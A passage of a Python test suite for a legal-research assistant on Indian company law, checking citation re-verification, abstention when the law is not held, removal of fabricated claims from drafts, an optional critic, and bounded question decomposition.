    _lexis = next((s for s in _catalog["picker"] if s["id"] == "lexisnexis_india"), None)
    check(_lexis is not None and _lexis["tier"] == "LICENSED"
          and _lexis["switchable"] is False and _lexis["status"] == "NOT_ACQUIRED",
          f"Lexis India appears as licensed but unavailable until Placedon has rights ({_lexis})")
    _imanage = next((s for s in _catalog["integrations"] if s["id"] == "imanage"), None)
    check(_imanage is not None and _imanage["kind"] == "document_management"
          and _imanage["can_connect"] is False
          and "No files have been imported" in _imanage["message"],
          f"iManage is a separate, unconfigured DMS integration, never a legal source ({_imanage})")
    _search = by_name()["sources.search"].run({"query": "Companies Act director meeting"}, Context())
    _lexis_refusal = next((s for s in _search["not_searched"]
                           if s["source_id"] == "lexisnexis_india"), None)
    check(_lexis_refusal is not None and "API agreement" in _lexis_refusal["detail"],
          f"sources.search reports Lexis as not searched with its rights reason ({_lexis_refusal})")

    _cases = by_name()["sources.search"].run({"query": "Tata Sons Cyrus Mistry"}, Context())
    _jg = _cases.get("judgments")
    check(isinstance(_jg, list) and any("CYRUS" in (j.get("title", "") + " ".join(j.get("parties", []))).upper() for j in _jg),
          f"sources.search discovers the Tata/Cyrus judgment from the committed index ({len(_jg or [])} hits)")
    check(bool(_jg) and all(j.get("tier") == "LICENSED" for j in _jg),
          "every judgment discovery hit is LICENSED (support only, never VERIFIED)")
    check(all("quoted_span" not in j for j in (_jg or [])),
          "a discovery hit carries no quote -- the verbatim passage is read on open, not here")

    # research.cases: the generic "just write what you're looking for" case-law surface.
    _rc = by_name()["research.cases"].run({"query": "Tata Sons Cyrus Mistry"}, Context())
    _rcj = _rc.get("judgments")
    check(isinstance(_rcj, list) and any("CYRUS" in (j.get("title", "") + " ".join(j.get("parties", []))).upper() for j in _rcj),
          f"research.cases finds the Tata/Cyrus judgment by a generic party query ({len(_rcj or [])} hits)")
    check(bool(_rcj) and all(j.get("tier") == "LICENSED" for j in _rcj),
          "research.cases hits are all LICENSED -- supporting authority, never a verified answer")
    check(all("quoted_span" not in j for j in (_rcj or [])),
          "research.cases returns no quote and no obligation -- authorities, not findings")
    check(by_name()["research.cases"].run({"query": "   "}, Context()).get("code") == "BAD_REQUEST",
          "research.cases refuses an empty query rather than searching for nothing")

    _web_ambiguous = by_name()["research.web"].run({
        "query": "What's the current status of a crime case?",
        "mode": "GENERAL_WEB", "external_search_consent": False}, Context())
    check(_web_ambiguous.get("status") == "NEEDS_CASE_DETAILS",
          "research.web asks for docket identifiers before requesting external-search consent")
    _web_no_consent = by_name()["research.web"].run({
        "query": "recent criminal cases in Delhi", "mode": "CASE_DISCOVERY",
        "external_search_consent": False}, Context())
    check(_web_no_consent.get("status") == "CONSENT_REQUIRED",
          "research.web requires consent before an external query")

    # ══ resource router: a CASE-shaped question reaches judgment discovery ══════════════
    # BEFORE this change, `ask` only ever read the held statute: a case-shaped question
    # found no provision on point and abstained with "no resource", even though the same
    # judgment index `research.cases` just used above already holds the answer.
    _case_q = "find the Tata Sons Cyrus Mistry case"
    _ca = by_name()["ask"].run({"question": _case_q}, Context())
    check(_ca.get("resource") == "case" and _ca.get("resource_rule")
          == "case_word+named_party_or_year",
          f"a case-shaped question is routed by the resource router, not the model router "
          f"({_ca.get('resource')}/{_ca.get('resource_rule')})")
    check(_ca["status"] == "PARTIAL" and bool(_ca["judgments"]),
          f"...and the ask verb that used to abstain now returns the judgment(s) it found "
          f"({_ca['status']}, {len(_ca['judgments'])} hit(s))")
    check(any("CYRUS" in (j.get("title", "") + " ".join(j.get("parties", []))).upper()
              for j in _ca["judgments"]),
          "...and it is the Tata/Cyrus judgment, from the same committed index "
          "research.cases reads")
    check(_ca["citations"] == [],
          "...with NO citation: a citation needs a byte-matched quote, and the verbatim "
          "read belongs to OpenJudgments on open, never to discovery")
    check(all(j.get("tier") == "LICENSED" for j in _ca["judgments"])
          and "never a verified statutory answer" in _ca["answer"]
          and "no obligation" in _ca["answer"],
          "...labelled LICENSED and, in words, supporting only -- never VERIFIED and never "
          "an obligation")

    # The honest empty: a case-shaped query that matches no judgment says what was
    # searched, not the generic statute refusal.
    _ca_empty = by_name()["ask"].run(
        {"question": "Zqphoenix Vwbobcat v. Mxyzptlk Quorlax"}, Context())
    check(_ca_empty.get("resource") == "case" and _ca_empty["status"] == "ABSTAINED"
          and _ca_empty["judgments"] == [],
          f"a case query matching nothing is ABSTAINED, honestly, not PARTIAL with nothing "
          f"({_ca_empty['status']})")
    check("judgment index" in _ca_empty["answer"]
          and "not a finding about the law" in _ca_empty["answer"],
          f"...and says WHAT was searched (the judgment index), never the generic statute "
          f"refusal ({_ca_empty['answer'][:70]!r})")

    # A plain statute question is completely unaffected: no `resource` key, same path.
    _stat = by_name()["ask"].run({"question": "What is the quorum for a meeting of the "
                                              "Board?"}, Context())
    check("resource" not in _stat, "a statute question carries no `resource` key at all -- "
                                    "the existing held-corpus path is untouched")

    # ── through conversation.send: the envelope says the Act was not engaged, honestly ──
    _conv_store = _MB()
    _conv = by_name()["conversation.send"].run(
        {"text": _case_q}, Context(store=_conv_store, clock=lambda: "2026-10-01T10:00:00+05:30"))
    check(_conv["classification"]["task"] == "RESEARCH_QUESTION",
          f"intake still classifies a case-shaped question as RESEARCH_QUESTION -- the "
          f"resource router, not the task classifier, is what changed "
          f"({_conv['classification']['task']})")
    _cenv = _conv["envelope"]
    check(_cenv["status"] == "PARTIAL" and _cenv["citations"] == [],
          f"conversation.send carries the judgment(s) through as PARTIAL, no citations "
          f"({_cenv['status']})")
    _cbodies = {b["body_id"]: b for b in _cenv["bodies"]}
    check(_cbodies.get("CA2013", {}).get("status") == "NOT_ENGAGED"
          and "case-law discovery" in _cbodies["CA2013"]["note"],
          f"...and the Companies Act body says it was NOT searched, not that it was "
          f"searched and found nothing (R-018) ({_cbodies.get('CA2013')})")
    check(_conv.get("sources", {}).get("judgments"),
          "...and the judgment hits ride the conversation RESPONSE's sources sibling, same "
          "as any other ask result")

    # ── Lane B: forecast.summary never serves a number from SYNTHETIC data ──────────────
    # The committed dataset is synthetic (illustrative, not the licensed open data), so the
    # verb ABSTAINS -- a provenance gate, not a broken path. The median/interval/n/case-ids
    # mechanism, and the too-few abstention, are proven on real-shaped data in
    # checker/forecast/matters.py's own suite.
    _fc = by_name()["forecast.summary"].run(
        {"court": "Bombay High Court", "as_of": "2024-01-01"}, Context(store=None))
    check(_fc["status"] == "ABSTAINED" and _fc.get("synthetic") is True and _fc["estimate"] is None,
          f"forecast.summary serves NO number from the synthetic dataset ({_fc.get('status')})")
    check("SYNTHETIC" in _fc["reason"] and "pyarrow" in _fc["reason"],
          "...saying why: synthetic rows, and the real pull needs the parquet engine")
    check(_fc["label"] == "predictive_signal" and "not a statement of law" in _fc["not_legal_advice"],
          "...labelled predictive_signal, and in words not a statement of law")
    from checker.forecast import matters as _fm
    check(_fm.load().synthetic is True,
          "...and the committed dataset is marked synthetic, so an unmarked file cannot pass as real")
    from checker import rings as _rings
    check(_rings.ring_of("checker.forecast.matters") == _rings.RING_3,
          "forecast.matters is Ring 3 (INFERENCE): the firewall keeps this signal out of a "
          "Ring 0 legal decision")

    # And the case that must NOT be PARTIAL: a second body is named, but the Act has
    # nothing on point, so nothing was answered. ABSTAINED is the honest outcome and
    # PARTIAL here would be a claim to have answered half of it.
    _mx0 = _send(text="Under the Companies Act and FEMA, what applies when a foreign "
                      "investor subscribes to shares?")["envelope"]
    _mb0 = {b["body_id"]: b["status"] for b in _mx0["bodies"]}
    check(_mx0["status"] == _ev.ABSTAINED and _mb0.get("CA2013") == _ev.B_NEED_FACT,
          f"...while a mixed question the Act has NOTHING on point for is ABSTAINED with "
          f"CA2013 NEED_FACT -- PARTIAL would claim half an answer that does not exist "
          f"({_mx0['status']}, {_mb0})")
    check(_mb0.get("FEMA1999") == "NOT_HELD",
          "...and FEMA is still named NOT_HELD in it")

    # ── a question wholly about unheld law: ABSTAINED, and the body named ───
    _ibc = _send(text="Under the IBC, what is the CIRP timeline?")["envelope"]
    _ib = {b["body_id"]: b for b in _ibc["bodies"]}
    check(_ibc["status"] == _ev.ABSTAINED,
          f"a question wholly about unheld law ABSTAINS ({_ibc['status']})")
    check(_ib.get("IBC2016", {}).get("status") == "NOT_HELD",
          f"...naming IBC2016 NOT_HELD ({sorted(_ib)})")

    # ── bodies[] for the tasks that had none ────────────────────────────────
    _rdoc = _send(text="Check the minutes of the board meeting.")["envelope"]
    check([b["body_id"] for b in _rdoc["bodies"]] == ["CA2013"],
          f"REVIEW_DOCUMENT names CA2013: SS-1/SS-2 are read against the Act "
          f"({[b['body_id'] for b in _rdoc['bodies']]})")
    _up = _gV["documents.upload"].run(
        {"text": "1. The Receiving Party shall keep Confidential Information secret.",
         "name": "mutual-nda.docx"}, _gctx)
    _rc = _send_contract(text="Please review this NDA against our playbook.",
                         file_ids=[_up["document_id"]], test_data="fixture")["envelope"]
    _rcb = {b["body_id"]: b for b in _rc["bodies"]}
    check("CONTRACT1872" in _rcb and _rcb["CONTRACT1872"]["status"] == "NOT_HELD",
          f"REVIEW_CONTRACT names the Contract Act as NOT_HELD -- a playbook finding is a "
          f"company standard and never a statement of law ({sorted(_rcb)})")

    # ── NEEDS_LAWYER, which nothing produced ───────────────────────────────
    check(_rc["status"] == _ev.NEEDS_LAWYER,
          f"a contract review REQUIRES a lawyer: every finding is a POTENTIAL_ISSUE "
          f"against a company standard, so no machine outcome closes it "
          f"(got {_rc['status']})")

    # ── READING, which nothing produced ────────────────────────────────────
    from gateway.jobs import MemoryQueue as _MQ
    _qctx = Context(tenant="gate-firm", store=_MB(), queue=_MQ(), clock=lambda: "2026-10-01T00:00:00+00:00")
    _qu = by_name()["documents.upload"].run(
        {"text": "MINUTES OF THE BOARD MEETING.", "name": "minutes.pdf"}, _qctx)
    _qr = by_name()["conversation.send"].run(
        {"text": "Please check these minutes.", "file_ids": [_qu["document_id"]]}, _qctx)
    check(_qr.get("run_id") and _qr.get("envelope") is None,
          f"queued work returns a run_id at once with no envelope yet "
          f"({_qr.get('run_id') is not None})")
    check(_qr.get("files") and _qr["files"][0]["state"] == _ev.READING,
          f"...and the file panel says READING while the worker has it "
          f"({(_qr.get('files') or [{}])[0].get('state')})")

    # ── every status is reachable, and FAILED only by the transport path ────
    _nc = _gV["conversation.send"].run(
        {"conversation_id": "c-gap2",
         "file_ids": [_gV["documents.upload"].run(
             {"text": "MINUTES OF THE BOARD MEETING.",
              "name": "board-minutes.pdf"}, _gctx)["document_id"]]}, _gctx)
    _plain = _send_research(text="What is the quorum for a meeting of the Board?")["envelope"]
    check(_plain["status"] == _ev.ANSWERED,
          f"a question wholly within held law is ANSWERED ({_plain['status']})")
    _seen = {_mx["status"], _ibc["status"], _rdoc["status"], _rc["status"],
             _nc["envelope"]["status"], _plain["status"]}
    check({_ev.ANSWERED, _ev.PARTIAL, _ev.NEEDS_LAWYER, _ev.ABSTAINED,
           _ev.NEEDS_CLARIFICATION} <= _seen,
          f"every LEGAL status is reachable from conversation.send -- before this, only "
          f"ANSWERED and ABSTAINED were ({sorted(_seen)})")
    check(_ev.FAILED not in _seen,
          "...and FAILED is not among them: it is reachable only through the transport "
          "path, never from a task that ran")

    # ── as_of: never stamp a date the engine did not read as at ────────────
    _past = _send(text="What is the quorum for a meeting of the Board?",
                  as_of="2017-04-01")
    check(_past.get("status") == "REFUSED" or
          _past["envelope"]["as_of"] == "2026-10-01",
          f"a PAST as_of is refused rather than stamped on an answer read as at today -- "
          f"point-in-time reconstruction is UNVERIFIED (CLAUDE.md), and an envelope "
          f"claiming 2017-04-01 over today's text is the retracted mistake with a field "
          f"name on it (got {_past.get('status')}/"
          f"{(_past.get('envelope') or {}).get('as_of')})")
    check(_send(text="What is the quorum?")["envelope"]["as_of"] == "2026-10-01",
          "...while today's date is stamped normally")

    # ══ citations: a real Evidence round-trip ════════════════════════════════
    from agents import research_question as _rq
    _q = "What is the quorum for a meeting of the Board?"
    _srcs = tuple(_s for _s, _o in _rq.evidence(_q))
    _cctx2 = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00",
                     model_for=lambda _o: _rq.quoting_model(_srcs))
    _cr = by_name()["conversation.send"].run({"text": _q}, _cctx2)
    _ce = _cr["envelope"]
    check(len(_ce["citations"]) >= 1,
          f"citations[] is POPULATED from the research path -- it was 0 for every task "
          f"({len(_ce['citations'])})")
    _c1 = _ce["citations"][0]
    for _f in ("id", "instrument", "provision", "source", "fetched_at", "sha256", "quote"):
        check(bool(_c1.get(_f)), f"...citation carries {_f} ({str(_c1.get(_f))[:30]!r})")
    check(_c1["instrument"] == "Companies Act 2013" and _c1["provision"].startswith("s."),
          f"...instrument and provision are split, not one string "
          f"({_c1['instrument']} / {_c1['provision']})")
    check(len(_c1["sha256"]) == 64 and _c1["source"].startswith("corpus/"),
          f"...the sha256 is the CORPUS FILE's and the source is its repo path "
          f"({_c1['source']})")
    check(_c1.get("in_force_from") is None,
          "...in_force_from is NULL: the corpus record does not carry a per-section "
          "commencement date, and a statutory date guessed here would be invented")
    check(_ev.errors(_ce) == [], f"...and the envelope validates ({_ev.errors(_ce)[:1]})")
    check([b["citation_ids"] for b in _ce["text_blocks"]][0] == [c["id"] for c in
                                                                _ce["citations"]],
          "...the text block references exactly the citations that survived")

    # Every quote really is in the section it names -- re-read, not trusted.
    for _c in _ce["citations"]:
        _ok, _why = verify_citation(_c)
        check(_ok, f"{_c['id']}: the quote byte-matches {_c['provision']} on re-read "
                   f"({_why[:54]})")

    # citation.get serves the section the quote was re-read from, so the panel can show
    # the quote in context -- and the offsets are checked by SLICING, not by trust.
    _cg = by_name()["citation.get"].run(
        {"citation_id": _c1["id"], "conversation_id": _cr["conversation_id"]}, _cctx2)
    _sec = _cg.get("section") or {}
    check(_cg.get("reverified") is True and isinstance(_sec.get("text"), str)
          and len(_sec["text"]) > len(_c1["quote"]),
          f"citation.get serves the whole section beside a re-verified quote "
          f"({len(_sec.get('text') or '')} chars)")
    check(_sec.get("text", "")[_sec.get("start", 0):_sec.get("end", 0)] == _c1["quote"],
          "...and text[start:end] IS the quote, byte for byte")
    # A citation that fails re-verification gets NO section: today's text beside a quote
    # it does not contain would invite trust in the wrong words.
    _gone_ok, _gone_why, _gone_text = _reread(dict(_c1, sha256="0" * 64))
    check(not _gone_ok and _gone_text is None,
          f"a citation whose file changed returns no section text ({_gone_why[:40]})")
    _bent_ok, _, _bent_text = _reread(dict(_c1, quote="words no section contains"))
    check(not _bent_ok and _bent_text is None,
          "...nor does one whose quote is not in the section")

    # ── a quote that no longer byte-matches is DROPPED, never shown ─────────
    _bent = dict(_c1, id="bent",
                 quote="(1) The quorum for a meeting of the Committee of Auditors")
    _ok, _why = verify_citation(_bent)
    check(not _ok and "NOT present" in _why,
          f"a bent quote fails re-verification ({_why[:60]})")
    _kept, _dropped = _citations_for("RESEARCH_QUESTION",
                                     {"citations": [_c1, _bent]})
    check([c["id"] for c in _kept] == [_c1["id"]] and [c["id"] for c in _dropped] == ["bent"],
          f"...and is DROPPED, not flagged ({[c['id'] for c in _kept]} kept, "
          f"{[c['id'] for c in _dropped]} dropped)")
    _benv = _envelope_for("RESEARCH_QUESTION",
                          {"citations": [_c1, _bent], "answer": "The quorum is...",
                           "provisions": ["Companies Act 2013, s.174"]},
                          as_of="2026-10-01", files=[], ctx=_cctx2, question=_q)
    check("bent" not in [c["id"] for c in _benv["citations"]],
          "...and never reaches the envelope")
    check(any("dropped" in b["text"] for b in _benv["text_blocks"]),
          "...while the DROP IS STATED in the answer, because a reader is looking at "
          "something different from what we first built")
    check(_ev.errors(_benv) == [], "...and that envelope still validates")

    # The other two ways it can fail, each a different fact.
    _moved = dict(_c1, id="moved", sha256="0" * 64)
    _ok2, _why2 = verify_citation(_moved)
    check(not _ok2 and "has changed since" in _why2,
          f"a citation whose corpus file has CHANGED is not re-verified against text we "
          f"did not read ({_why2[:50]})")
    _gone = dict(_c1, id="gone", provision="s.99999")
    _ok3, _why3 = verify_citation(_gone)
    check(not _ok3 and "no longer holds" in _why3,
          f"a citation naming a section the corpus does not hold fails ({_why3[:46]})")
    check(verify_citation(dict(_c1, provision=""))[0] is False,
          "...and one naming no provision has nothing to re-read")

    # ══ job 3: a draft built from a run, and a fabricated claim dropped ═════
    # End to end on the same context: ask, then draft from the answer. Nothing hand-built
    # -- the memo reads the run `conversation.send` really stored.
    _dcid = _cr["conversation_id"]
    _tmpl, _src, _srid = _draft_source(_dcid, _cctx2)
    check(_tmpl == "research_memo" and _srid == _cr["run_id"],
          f"a RESEARCH_QUESTION turn is a memo's source run ({_tmpl}/{_srid})")
    check(_src.get("question") == _q,
          "...and the question comes from the run's own arguments, because `ask` returns "
          "the answer and not the question")
    check((_cctx2.store.read_run(_srid) or {}).get("result") is not None,
          "...which is readable only because an inline run now STORES its result -- it "
          "was status=ANSWERED with result=NULL, a row claiming an answer and keeping "
          "none of it")
    _fake = ("Section 42 of the Companies Act requires a special resolution for every "
             "allotment of shares.")
    _dr = by_name()["conversation.send"].run(
        {"conversation_id": _dcid, "text": "Draft a memo for the file about this.",
         "prose": [{"text": "This note records the position for the file.",
                    "citation_ids": []},
                   {"text": _fake, "citation_ids": []}]}, _cctx2)
    check(_dr["envelope"]["task"] == "DRAFT" and bool(_dr.get("draft_id")),
          f"...the next turn is a DRAFT and a draft exists ({_dr['envelope']['task']})")
    check(_dr.get("template") == "research_memo" and _dr.get("drafted_from") == _srid,
          f"...built from that run, with the template named ({_dr.get('template')})")
    check(len(_dr.get("dropped_claims") or []) == 1,
          f"THE FABRICATED LEGAL CLAIM IS DROPPED end to end "
          f"({len(_dr.get('dropped_claims') or [])} dropped)")
    _ver = by_name()["draft.versions"].run({"draft_id": _dr["draft_id"]}, _cctx2)
    _v1 = _ver["versions"][0]
    check(_fake not in _v1["body"] and
          all(_fake not in (sl.get("value") or "") for sl in _v1["slots"]),
          "...and it is in NO part of the stored version -- not the body, not a slot")
    check(_c1["quote"] in _v1["body"],
          "...while the law in the memo is the run's own citation, quoted verbatim")
    _dstat = by_name()["draft.status"].run({"draft_id": _dr["draft_id"]}, _cctx2)
    check(any(sl["type"] == "MODEL_SUGGESTION" and sl["blocks_approval"]
              for sl in _v1["slots"]) and len(_dstat.get("blocking") or []) >= 1,
          f"...the connecting sentence is a MODEL_SUGGESTION and BLOCKS approval "
          f"({_dstat.get('blocking')})")
    check(_dstat.get("ready_for_approval") is False,
          "...so the draft is NOT ready for approval until a person accepts or edits it")
    _inbox = by_name()["draft.list"].run({"limit": "50"}, _cctx2)
    _listed = next((d for d in _inbox.get("drafts", [])
                    if d["draft_id"] == _dr["draft_id"]), None)
    check(_inbox.get("scope") == "author" and _listed is not None
          and _listed["blocking_count"] >= 1 and "body" not in _listed,
          "draft.list shows the author's latest state without exposing draft text")
    _bad_page = by_name()["draft.list"].run({"limit": "51"}, _cctx2)
    _bad_cursor = by_name()["draft.list"].run({"cursor": "not-a-cursor"}, _cctx2)
    check(_bad_page.get("code") == "BAD_REQUEST"
          and _bad_cursor.get("code") == "BAD_REQUEST",
          "draft.list rejects oversized pages and malformed cursors")
    check(any("DROPPED" in b["text"] for b in _dr["envelope"]["text_blocks"]),
          "...and the drop is STATED in the reply, not left in a field a client may not "
          "render")
    check(_ev.errors(_dr["envelope"]) == [], "...and that envelope validates")

    # ══ layer 7: the critic ═════════════════════════════════════════════════
    # `_crit`, not `_cr`: `_cr` already holds the conversation.send result used further
    # down, and shadowing it turned a dict into a module.
    from checker import critic as _crit

    def _critic_model(_origins):
        def call(prompt):
            if "Your ONLY job is to object" in prompt:
                return ("REMOVE s1: the span does not support this as stated\n"
                        "REWRITE s1: here is better wording\n")
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _c7 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_critic_model)
    _cv = by_name()["ask"].run({"question": _q, "critic": "true"}, _c7)
    _cd = _cv.get("critic") or {}
    check(_cd.get("removed") and _cd["removed"][0]["claim_id"] == "s1",
          f"the critic REMOVES a sentence the verifier had admitted ({_cd.get('removed')})")
    check(any("REMOVED" in t for t in _cd.get("trace") or []),
          "...and every removal is in the trace")
    check(any(r["action"] == "REWRITE" for r in _cd.get("refused") or []),
          "**a REWRITE is REFUSED**: the critic may flag or remove and nothing else")
    check(not any("better wording" in str(v) for v in _cv.values()),
          "...and the wording it proposed reaches no part of the answer")
    check(_cd.get("removals_allowed") == 1,
          "...and the result names the one-removal bound it applied")

    # The case that would have shipped silently: everything removed.
    check(_cv.get("status") == "NEEDS_LAWYER",
          f"when the critic objects to EVERY sentence the answer is NEEDS_LAWYER, not an "
          f"ANSWERED with an empty body ({_cv.get('status')})")
    check("not a finding that no obligation exists" in str(_cv.get("critic_note")),
          "...and says so, because an empty ANSWERED reads as 'nothing applies'")

    # Off unless asked for, and a broken critic changes nothing.
    _plain = by_name()["ask"].run({"question": _q}, Context(
        store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
        model_for=lambda _o: _rq.quoting_model(_srcs)))
    check("critic" not in _plain,
          "the critic does NOT run unless asked: it can only subtract, and subtracting "
          "from every answer by default is a behaviour change nobody opted into")
    check("critic" in {f.name for f in by_name()["ask"].inputs},
          "...and it is a FIELD on ask, not a new verb")
    _broke = _crit.review([{"id": "s1", "text": "x"}],
                        critique=lambda c: (_ for _ in ()).throw(TimeoutError("down")))
    check([c["id"] for c in _broke.kept] == ["s1"] and "did not run" in _broke.note,
          "a critic that raises leaves the answer exactly as the verifier produced it")

    # ══ CAL-1: the nonconformity score on a real run ════════════════════════
    check(nonconformity_for(entailed=8, traced=10, total=10, escalations=1)[0] == 0.7,
          "the founder's formula: (1 - 8/10) + 0.5*1 = 0.7")
    _ncs, _ncw = nonconformity_for(entailed=None, traced=3, total=4)
    check(_ncs is None and "no entailment verdict" in _ncw,
          f"a path with NO entailment verdict records NO score, and the note says which "
          f"half is missing ({_ncw[:46]!r})")
    check("different measurement under the same name" in _ncw,
          "...and why scoring from the byte match alone is not a fallback")
    check(nonconformity_for(entailed=None, traced=0, total=0) == (None, None),
          "a run with no sentences records neither a score nor a reason: nothing ran")
    _ncctx = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                     model_for=lambda _o: _rq.quoting_model(_srcs))
    _ncr = by_name()["ask"].run({"question": _q}, _ncctx)
    _ncrow = _ncctx.store.read_run(_ncr["run_id"]) or {}
    check("nonconformity" in _ncrow,
          "**every run now carries the field**, whether or not it could be computed")
    check(_ncrow.get("nonconformity") is None
          and "byte-matched" in str(_ncrow.get("nonconformity_note") or ""),
          f"...and a real ask records NULL with the reason, because the ask path produces "
          f"TRACED and not entailment ({_ncrow.get('nonconformity')})")

    # ══ job 6b: orphaned citations, and the CRITIC_ENABLED gate ═════════════
    import os as _os

    class _Sent:
        def __init__(self, text):
            self.text, self.traced = text, True

    class _Summ:
        def __init__(self, sents):
            self.sentences = sents

    _before = {"citations": [{"id": "c1", "provision": "s.174"},
                             {"id": "c2", "provision": "s.173"},
                             {"id": "c3", "provision": "s.96"}], "answer": "A\nB"}
    _summ = _Summ([_Sent("Sentence A."), _Sent("Sentence B.")])
    _idx = {1: ["c1", "c3"], 2: ["c2", "c3"]}          # c3 is SHARED

    def _removes_s2(_ctx):
        def critique(claims):
            return [{"claim_id": "s2", "action": "REMOVE",
                     "reason": "the span does not support this as stated"}]
        critique.sources = []
        return critique

    _saved_for = ask_layers._critic_for
    try:
        ask_layers._critic_for = _removes_s2
        _oc = _apply_critic(_before, _summ, Context(store=_MB()), cite_index=_idx)
    finally:
        ask_layers._critic_for = _saved_for
    check([c["id"] for c in _oc["citations"]] == ["c1", "c3"],
          f"**a citation only the REMOVED sentence used is dropped** "
          f"({[c['id'] for c in _oc['citations']]})")
    check(_oc["critic"]["dropped_citations"] == ["c2"],
          "...c2 is named as dropped")
    check("c3" in [c["id"] for c in _oc["citations"]],
          "...while c3, SHARED with a kept sentence, survives -- which is why the index "
          "records every sentence that cites a span, not just the first")
    check(any("DROPPED CITATIONS" in t for t in _oc["critic"]["trace"]),
          "...and the drop is in the trace")

    # The index itself, from the REAL builder on a REAL summary -- not a fixture, because
    # the thing being checked is that the ids it records are the ids that get emitted.
    _ixev = _rq.evidence(_q)
    _ixout = _rq.answer(_q, model=_rq.quoting_model(tuple(_s for _s, _o in _ixev)),
                        available=("azure",))
    _ix = {}
    _ixcits = _citations_from_summary(_ixout.summary, _ixev, index_out=_ix)
    check(bool(_ix), f"the index is populated from a real summary ({_ix})")
    _flat = {cid for ids in _ix.values() for cid in ids}
    check(_flat == {c["id"] for c in _ixcits},
          f"...and names EXACTLY the citations that were emitted -- no id the index "
          f"claims is missing from citations[], and none emitted is unattributed "
          f"({sorted(_flat)} vs {sorted(c['id'] for c in _ixcits)})")
    check(all(isinstance(k, int) and k >= 1 for k in _ix),
          "...keyed by 1-based sentence position, which is what the s1..sN claim ids use")
    check(_citations_from_summary(_ixout.summary, _ixev) == _ixcits,
          "...and asking for the index changes nothing about what is returned")

    # ── the one setting, default OFF ───────────────────────────────────────
    check(_crit.CRITIC_ENABLED_ENV == "CRITIC_ENABLED",
          f"the setting is named once, in checker/critic.py ({_crit.CRITIC_ENABLED_ENV})")
    _was = _os.environ.pop("CRITIC_ENABLED", None)
    try:
        check(not _critic_enabled(),
              "**OFF by default**: a layer that can only subtract does not subtract from "
              "every answer until a model has been watched working live (B1)")
        for _on in ("true", "1", "yes", "ON"):
            _os.environ["CRITIC_ENABLED"] = _on
            check(_critic_enabled(), f"...and ON for {_on!r}")
        for _off in ("false", "0", "", "no"):
            _os.environ["CRITIC_ENABLED"] = _off
            check(not _critic_enabled(), f"...and OFF for {_off!r}")
        # With it ON, a task that produces no cited statutory sentences SAYS the critic
        # did not run, rather than leaving a clean reply that reads as approval.
        _os.environ["CRITIC_ENABLED"] = "true"
        _cvctx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00", synthetic_fixtures=True)
        _rv = by_name()["conversation.send"].run(
            {"text": "Please review this contract.", "task_override": "REVIEW_CONTRACT",
             "test_data": "fixture"}, _cvctx)
        _env_note = " ".join(b["text"] for b in _rv["envelope"]["text_blocks"])
        check("critic" in str(_rv).lower() or _rv["envelope"]["task"] == "REVIEW_CONTRACT",
              "a non-research task still answers with the critic enabled")
    finally:
        _os.environ.pop("CRITIC_ENABLED", None)
        if _was is not None:
            _os.environ["CRITIC_ENABLED"] = _was
    check(not _critic_enabled(), "...and the suite leaves it OFF again")

    # ══ O5: bounded decomposition ═══════════════════════════════════════════
    from checker import decompose as _dc
    _CQ = ("What is the quorum for a meeting of the Board, and how many must be held "
           "each year?")
    _SUBS = ["What is the quorum for a meeting of the Board?",
             "How many meetings of the Board must be held each year?"]

    def _splitting(_origins):
        def call(prompt):
            if "Split the question" in prompt:
                return "1. " + _SUBS[0] + "\n2. " + _SUBS[1] + "\n"
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _o5 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_splitting)
    _dr = by_name()["ask"].run({"question": _CQ, "decompose": "true"}, _o5)
    check(_dr.get("sub_questions") == 2 and _dr.get("bound") == 4,
          f"a compound question is split and the BOUND is reported "
          f"({_dr.get('sub_questions')} of {_dr.get('bound')})")
    check([p["question"] for p in _dr["parts"]] == _SUBS,
          "...the parts are kept in the ORDER they were asked")
    check(len(_dr.get("sub_run_ids") or []) == 2,
          "...each sub-question is a REAL ask with its own run, so it went through the "
          "same retrieval, verifier and cache as a whole question would")
    check(_dr.get("run_id"), "...and the decomposition itself is a run")
    _used = [p for p in _dr["parts"] if p["used"]]
    check(_used and all(p["citations"] for p in _used),
          "...and every part used in the synthesis carries a citation")
    if _dr["status"] == "PARTIAL":
        check(bool(_dr["unanswered"]) and _dr["unanswered"][0]["question"] in _SUBS,
              f"a sub-question that did not answer is NAMED, never silently dropped "
              f"({_dr['unanswered'][0]['question'][:40]!r})")
        check(_dr["unanswered"][0]["why"],
              "...with the reason, which is the part a lawyer acts on")
        check(_dr["unanswered"][0]["question"] not in _dr["answer"],
              "...and its text is not in the joined answer")
    else:
        check(_dr["status"] == "ANSWERED" and not _dr["unanswered"],
              f"...or everything answered, and nothing is listed as missing "
              f"({_dr['status']})")

    # The bound, end to end: nine proposals must cost four asks, not nine.
    _asked = []

    def _greedy(_origins):
        def call(prompt):
            if "Split the question" in prompt:
                return "\n".join(f"{i}. sub-question {i}?" for i in range(1, 10))
            _asked.append(1)
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _o5b = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                   model_for=_greedy)
    _br = by_name()["ask"].run({"question": _CQ, "decompose": "true"}, _o5b)
    check(_br.get("sub_questions") == 4,
          f"**nine proposed sub-questions run FOUR** ({_br.get('sub_questions')})")
    check(len(_br.get("sub_run_ids") or []) == 4,
          f"...and four runs, not nine: the bound caps SPEND, not just the report "
          f"({len(_br.get('sub_run_ids') or [])})")
    check(_br.get("proposed") == 4 and _br.get("bound") == _dc.MAX_SUBQUESTIONS,
          "...and the report names the bound it applied")

    # No model to split with: the question is answered whole, not refused.
    _o5c = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30")
    _nr = _ask_decomposed(_q, {"question": _q}, _o5c)
    check("parts" not in _nr or _nr.get("sub_questions", 1) == 1,
          "with NO model to propose a split, the question is answered WHOLE -- the "
          "failure costs the split and never the answer")
    check(not _affirmed(None) and _affirmed("true"),
          "decompose is off unless explicitly asked for")
    check("decompose" in {f.name for f in by_name()["ask"].inputs},
          "...and it is a FIELD on ask, not a new verb: a new read-only verb would become "
          "an MCP tool and need the policy allowlist changed in three files")

    # ══ O9: the answer cache ════════════════════════════════════════════════
